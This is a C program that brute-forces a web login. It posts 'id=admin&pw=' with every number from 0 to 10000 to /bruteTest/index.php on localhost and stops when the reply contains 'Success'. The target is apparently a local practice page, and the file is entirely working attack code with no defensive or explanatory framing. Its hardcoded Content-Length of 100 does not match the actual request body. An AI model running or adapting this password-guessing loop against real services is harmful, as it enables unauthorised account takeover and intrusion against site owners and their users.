#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <errno.h>

#define IP		"127.0.0.1"
#define PORT	80

#define MAX_HTTP_SIZE	3000
#define MIN_PASSWORD	0
#define MAX_PASSWORD	10000

void setnonblockingmode(int fd);
void ErrorHandling(const char *msg);

int main(int argc, char *argv[])
{
	int sock;
	struct sockaddr_in serv_addr;
	char http_cmn[MAX_HTTP_SIZE];
	char http_send[MAX_HTTP_SIZE];
	char http_recv[MAX_HTTP_SIZE];
	int pw;
	int recv_sz;

	setnonblockingmode(1);
	setnonblockingmode(2);

	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = inet_addr(IP);
	serv_addr.sin_port = htons(PORT);
	
	strcpy(http_cmn,"POST /bruteTest/index.php HTTP/1.1 \r\n");
	strcat(http_cmn,"Host: 127.0.0.1 \r\n");
	strcat(http_cmn,"Content-Type: application/x-www-form-urlencoded \r\n");
	strcat(http_cmn,"Content-Length: 100 \r\n");
	strcat(http_cmn,"\r\n");
	strcat(http_cmn,"id=admin&pw=");

	for(pw=MIN_PASSWORD; pw<=MAX_PASSWORD; pw++)
	{
		printf("[*] Trying %d...\n",pw);
		
		sock = socket(PF_INET, SOCK_STREAM, 0);
		if(sock == -1)
			ErrorHandling("socket() error!!");

		if(connect(sock, (struct sockaddr*) &serv_addr, sizeof(serv_addr)) == -1)
			ErrorHandling("connect() error!!");
		
		sprintf(http_send, "%s%d", http_cmn,pw);
		send(sock, http_send, strlen(http_send), 0);
		shutdown(sock, SHUT_WR);
		
		while((recv_sz=recv(sock, http_recv, MAX_HTTP_SIZE-1, 0)) != 0)
		{
			http_recv[recv_sz] = '\0';
			if(strstr(http_recv, "Success")) {
				printf("[*] Found!\n[*] Password is %d\n", pw);
				close(sock);
				goto END;
			}
		}

		close(sock);
		sleep(3);
	}
END:

	return 0;
}

void setnonblockingmode(int fd)
{
	int flag = fcntl(fd, F_GETFL, 0);
	fcntl(fd, F_SETFL, flag | O_NONBLOCK);
}

void ErrorHandling(const char *msg)
{
	fputs(msg, stderr);
	fputc('\n', stderr);
	exit(1);
}
